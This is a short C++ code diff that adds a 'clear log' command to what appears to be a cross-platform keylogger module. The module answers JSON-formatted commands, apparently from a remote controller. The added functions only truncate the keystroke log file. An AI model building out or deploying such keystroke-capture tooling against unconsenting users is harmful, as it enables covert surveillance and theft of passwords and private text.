@@ -109,6 +109,14 @@ std::string keyloggerGetLogJson() {
            escapeJson(ss.str()) + "\"}";
 }
 
+std::string keyloggerClearLogJson() {
+    std::ofstream reset(kKeylogPath, std::ios::trunc);
+    if (!reset) {
+        return "{\"ok\":false,\"command\":\"KEYLOGGER_CLEAR_LOG\",\"message\":\"log_file_open_failed\"}";
+    }
+    return "{\"ok\":true,\"command\":\"KEYLOGGER_CLEAR_LOG\",\"message\":\"cleared\"}";
+}
+
 #elif defined(_WIN32)
 
 #ifndef NOMINMAX
@@ -236,6 +244,15 @@ std::string keyloggerGetLogJson() {
            escapeJson(ss.str()) + "\"}";
 }
 
+std::string keyloggerClearLogJson() {
+    std::lock_guard<std::mutex> lock(g_winKeylogFileMutex);
+    std::ofstream reset(winKeylogPathRef(), std::ios::trunc);
+    if (!reset) {
+        return "{\"ok\":false,\"command\":\"KEYLOGGER_CLEAR_LOG\",\"message\":\"log_file_open_failed\"}";
+    }
+    return "{\"ok\":true,\"command\":\"KEYLOGGER_CLEAR_LOG\",\"message\":\"cleared\"}";
+}
+
 #else
 
 std::string keyloggerStartJson() {
@@ -248,6 +265,10 @@ std::string keyloggerStopJson() {
 
 std::string keyloggerGetLogJson() {
     return "{\"ok\":false,\"command\":\"KEYLOGGER_GET_LOG\",\"message\":\"unsupported_os\"}";
+}
+
+std::string keyloggerClearLogJson() {
+    return "{\"ok\":false,\"command\":\"KEYLOGGER_CLEAR_LOG\",\"message\":\"unsupported_os\"}";
 }
 
 #endif
